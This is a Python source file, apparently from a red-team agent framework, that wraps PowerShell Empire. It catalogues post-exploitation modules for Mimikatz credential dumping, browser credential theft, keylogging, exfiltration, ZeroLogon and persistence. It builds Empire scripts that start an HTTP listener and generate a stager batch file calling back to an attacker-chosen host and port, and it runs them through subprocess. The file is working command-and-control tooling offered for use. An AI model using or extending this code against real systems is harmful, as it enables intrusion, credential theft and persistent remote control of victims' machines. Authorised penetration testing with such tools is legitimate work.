from __future__ import annotations

import json
import os
import subprocess
import tempfile
from typing import Any

from skoll_agent.engines.base_engine import BaseEngine, EngineResult


EMPIRE_MODULES = [
    ("collection/ChromeDump", "Chrome credential dump", "high"),
    ("collection/FoxDump", "Firefox credential dump", "high"),
    ("collection/email_collector", "Email collector", "medium"),
    ("collection/netripper", "Network credential ripper", "high"),
    ("collection/screenCapture", "Screen capture", "medium"),
    ("collection/keylog", "Keylogger", "high"),
    ("collection/clipboard", "Clipboard monitor", "medium"),
    ("credentials/mimikatz/logonpasswords", "Mimikatz logonpasswords", "critical"),
    ("credentials/mimikatz/sam", "Mimikatz SAM dump", "critical"),
    ("credentials/mimikatz/dcsync", "Mimikatz DCSync", "critical"),
    ("credentials/mimikatz/kerberos", "Mimikatz Kerberos ticket dump", "critical"),
    ("credentials/mimikatz/lsadump", "Mimikatz LSA dump", "critical"),
    ("credentials/sessionGopher", "Session Gopher (PuTTY/WinSCP creds)", "high"),
    ("exfiltration/exfil", "Generic exfiltration", "medium"),
    ("exploitation/exploit/packetBlue", "PacketBlue exploit", "critical"),
    ("exploitation/exploit/zeroLogon", "ZeroLogon exploit", "critical"),
    ("persistence/elevated/registry", "Registry persistence", "high"),
    ("persistence/elevated/schtasks", "Scheduled task persistence", "high"),
    ("persistence/elevated/wmi", "WMI persistence", "high"),
    ("persistence/userland/registry", "Userland registry persistence", "medium"),
    ("situational_awareness/host/computerdetails", "Computer details", "info"),
    ("situational_awareness/host/injector", "Process injector", "high"),
    ("situational_awareness/network/arpscan", "ARP scan", "info"),
    ("situational_awareness/network/portscan", "Port scan", "info"),
    ("situational_awareness/network/powerview/share_finder", "PowerView share finder", "medium"),
    ("situational_awareness/network/bloodhound", "BloodHound ingestor", "high"),
    ("trollsploit/pickel", "Pickel (desktop control)", "medium"),
    ("trollsploit/messagebox", "Message box", "info"),
]


class EmpireEngine(BaseEngine):
    name = "empire"
    description = "PowerShell Empire post-explotacion. Listener, stager, ejecucion de modulos: credenciales, persistencia, reconocimiento, movimiento lateral."
    capabilities = ["red_team", "c2", "post_exploitation", "powershell", "active_directory", "lateral_movement"]

    def scan(self, target: str, **kwargs: Any) -> EngineResult:
        findings = []
        raw_lines: list[str] = []

        mode = kwargs.get("mode", "list_modules")
        lhost = kwargs.get("lhost", target)
        lport = int(kwargs.get("lport", 443))
        listener_type = kwargs.get("listener", "http")
        stager_type = kwargs.get("stager", "windows/launcher_bat")
        timeout = int(kwargs.get("timeout", 120))

        raw_lines.append(f"[INFO] Empire mode={mode}")

        if not self._check_empire(raw_lines):
            return EngineResult(success=False, raw_output="empire: not installed", findings=[{
                "file_path": "", "line_start": 0, "line_end": 0,
                "severity": "info", "title": "Empire no instalado",
                "description": "powershell-empire no encontrado. Instalar: sudo apt install powershell-empire starkiller",
                "tool": self.name, "rule_id": "empire-not-installed",
            }])

        if mode == "list_modules":
            self._list_empire_modules(findings, raw_lines)
        elif mode == "listener":
            self._start_listener(lhost, lport, listener_type, findings, raw_lines, timeout)
        elif mode == "stager":
            self._generate_stager(lhost, lport, stager_type, findings, raw_lines, timeout)
        elif mode == "lateral":
            self._lateral_movement(target, findings, raw_lines, timeout)
        elif mode == "persistence":
            self._persistence_checks(findings, raw_lines)
        elif mode == "quick_win":
            self._quick_win_modules(findings, raw_lines)
        else:
            raw_lines.append(f"[WARN] Modo no soportado: {mode}")

        summary = f"empire: {len(findings)} hallazgos"
        return EngineResult(
            success=bool(findings),
            raw_output="\n".join(raw_lines),
            findings=findings,
            summary=summary,
        )

    def _list_empire_modules(self, findings: list[dict[str, Any]],
                             raw_lines: list[str]) -> None:
        raw_lines.append(f"[INFO] Empire modules available: {len(EMPIRE_MODULES)}")
        for module, desc, severity in EMPIRE_MODULES[:15]:
            findings.append({
                "file_path": "", "line_start": 0, "line_end": 0,
                "severity": severity,
                "title": f"Empire module: {module}",
                "description": desc,
                "tool": self.name, "rule_id": f"empire-mod-{module.replace('/', '-')[:40]}",
                "module": module, "severity": severity,
            })
            raw_lines.append(f"[{severity.upper()}] {module}: {desc}")

    def _start_listener(self, lhost: str, lport: int, listener_type: str,
                        findings: list[dict[str, Any]],
                        raw_lines: list[str], timeout: int) -> None:
        raw_lines.append(f"[INFO] Preparando listener {listener_type} en {lhost}:{lport}")

        script = f"""
listeners
uselistener {listener_type}
set Name SkollListener
set Host http://{lhost}:{lport}
set Port {lport}
execute
back
"""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".empire", delete=False) as f:
            script_path = f.name
            f.write(script)

        cmd = f"powershell-empire server -s {script_path}"
        raw_lines.append(f"[INFO] Comando: {cmd}")
        raw_lines.append(f"[INFO] Para iniciar manualmente: powershell-empire server")
        raw_lines.append(f"[INFO]   Luego en cliente: connect, listeners, uselistener {listener_type}, ...")

        findings.append({
            "file_path": "", "line_start": 0, "line_end": 0,
            "severity": "info",
            "title": f"Empire listener configurado: {listener_type}://{lhost}:{lport}",
            "description": f"Listener {listener_type} en {lhost}:{lport}. Generar stager con: powershell-empire client, usestager {stager_type}",
            "tool": self.name, "rule_id": "empire-listener-ready",
            "listener": listener_type, "lhost": lhost, "lport": lport,
        })

    def _generate_stager(self, lhost: str, lport: int, stager_type: str,
                         findings: list[dict[str, Any]],
                         raw_lines: list[str], timeout: int) -> None:
        raw_lines.append(f"[INFO] Generando stager {stager_type} para {lhost}:{lport}")

        script = f"""
listeners
uselistener http
set Name SkollListener
set Host http://{lhost}:{lport}
set Port {lport}
execute
back
usestager {stager_type} SkollListener
set OutFile /tmp/empire_stager.bat
execute
exit
"""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".empire", delete=False) as f:
            script_path = f.name
            f.write(script)

        try:
            r = subprocess.run(
                ["powershell-empire", "server", "-s", script_path],
                capture_output=True, text=True, timeout=timeout,
            )
            output = r.stdout + r.stderr
            raw_lines.append(f"[INFO] Output: {output[:500]}")

            if os.path.exists("/tmp/empire_stager.bat"):
                findings.append({
                    "file_path": "", "line_start": 0, "line_end": 0,
                    "severity": "high",
                    "title": f"Empire stager generated: {stager_type}",
                    "description": f"Stager saved to /tmp/empire_stager.bat for listener {lhost}:{lport}",
                    "tool": self.name, "rule_id": "empire-stager-generated",
                    "stager": stager_type, "lhost": lhost, "lport": lport,
                })
                raw_lines.append("[INFO] Stager -> /tmp/empire_stager.bat")
            else:
                raw_lines.append(f"[WARN] Stager file not generated")
        except subprocess.TimeoutExpired:
            raw_lines.append("[TIMEOUT] empire stager generation timed out")
        except Exception as e:
            raw_lines.append(f"[ERR] empire: {e}")
        finally:
            try:
                os.unlink(script_path)
            except Exception:
                pass

    def _lateral_movement(self, target: str, findings: list[dict[str, Any]],
                          raw_lines: list[str], timeout: int) -> None:
        raw_lines.append(f"[INFO] Lateral movement simulation via Empire")
        lateral_modules = [
            ("powershell/persistence/elevated/schtasks", "Scheduled task lateral movement"),
            ("powershell/code_execution/invoke_shellcode", "Shellcode injection"),
            ("powershell/management/psremotely", "PSRemoting lateral movement"),
            ("powershell/management/wmi", "WMI lateral movement"),
        ]
        for mod, desc in lateral_modules:
            findings.append({
                "file_path": target, "line_start": 0, "line_end": 0,
                "severity": "high",
                "title": f"Lateral movement: {desc}",
                "description": f"Modulo Empire {mod} util para movimiento lateral a {target}",
                "tool": self.name, "rule_id": f"empire-lateral-{mod.split('/')[-1][:25]}",
                "module": mod, "description": desc,
            })

    def _persistence_checks(self, findings: list[dict[str, Any]],
                            raw_lines: list[str]) -> None:
        persistence_modules = [
            ("registry", "Registry RUN key", "elevated/registry"),
            ("schtasks", "Scheduled task", "elevated/schtasks"),
            ("wmi", "WMI event subscription", "userland/wmi"),
            ("startup", "Startup folder", "userland/startup"),
        ]
        for name, desc, path in persistence_modules:
            findings.append({
                "file_path": "", "line_start": 0, "line_end": 0,
                "severity": "high",
                "title": f"Persistence via Empire: {desc}",
                "description": f"Modulo Empire powershell/persistence/{path} permite persistencia via {name}",
                "tool": self.name, "rule_id": f"empire-persist-{name}",
                "persistence_method": name, "module_path": f"powershell/persistence/{path}",
            })

    def _quick_win_modules(self, findings: list[dict[str, Any]],
                           raw_lines: list[str]) -> None:
        quick_wins = [
            ("credentials/mimikatz/logonpasswords", "Dump credentials from memory", "critical"),
            ("credentials/mimikatz/sam", "Dump SAM hashes", "critical"),
            ("credentials/sessionGopher", "Gather saved session creds", "high"),
            ("collection/keylog", "Start keylogger", "high"),
            ("situational_awareness/host/computerdetails", "Enumerate host details", "info"),
            ("situational_awareness/network/portscan", "Scan internal network", "info"),
            ("situational_awareness/network/bloodhound", "Run BloodHound collector", "high"),
            ("trollsploit/messagebox", "Display message on target", "low"),
        ]
        for mod, desc, sev in quick_wins:
            findings.append({
                "file_path": "", "line_start": 0, "line_end": 0,
                "severity": sev,
                "title": f"Empire quick win: {desc}",
                "description": f"Modulo {mod}: {desc}",
                "tool": self.name, "rule_id": f"empire-qw-{mod.split('/')[-1][:25]}",
                "module": mod,
            })

    def _check_empire(self, raw_lines: list[str]) -> bool:
        try:
            r = subprocess.run(["powershell-empire", "--help"], capture_output=True, timeout=10)
            if r.returncode == 0:
                raw_lines.append("[INFO] powershell-empire OK")
                return True
            return False
        except FileNotFoundError:
            return False
        except Exception:
            return False

    def parse_output(self, raw_output: str) -> list[dict[str, Any]]:
        return []
